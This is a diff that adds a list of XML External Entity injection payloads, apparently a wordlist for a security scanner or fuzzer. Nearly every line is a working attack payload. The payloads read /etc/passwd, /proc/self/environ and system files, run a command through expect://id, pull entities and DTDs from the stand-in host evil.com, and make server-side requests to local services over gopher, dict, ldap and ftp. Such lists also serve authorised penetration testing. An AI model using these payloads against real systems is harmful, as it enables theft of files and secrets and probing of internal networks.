@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><test>&xxe;</test>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/test">]><test>&xxe;</test>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><test>&xxe;</test>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://evil.com/test.dtd">%xxe;]><test>test</test>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "expect://id">]><test>&xxe;</test>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "data://text/plain;base64,dGVzdA==">]><test>&xxe;</test>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///proc/version">]><test>&xxe;</test>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><test>&xxe;</test>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]><test>&xxe;</test>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:80/_test">]><test>&xxe;</test>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "dict://127.0.0.1:22/test">]><test>&xxe;</test>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "ldap://127.0.0.1:389/test">]><test>&xxe;</test>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "sftp://127.0.0.1:22/test">]><test>&xxe;</test>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "tftp://127.0.0.1:69/test">]><test>&xxe;</test>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "ftp://127.0.0.1:21/test">]><test>&xxe;</test>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<?xml version="1.0"?><!ENTITY xxe SYSTEM "/etc/passwd">
+&xxe;
+%xxe;
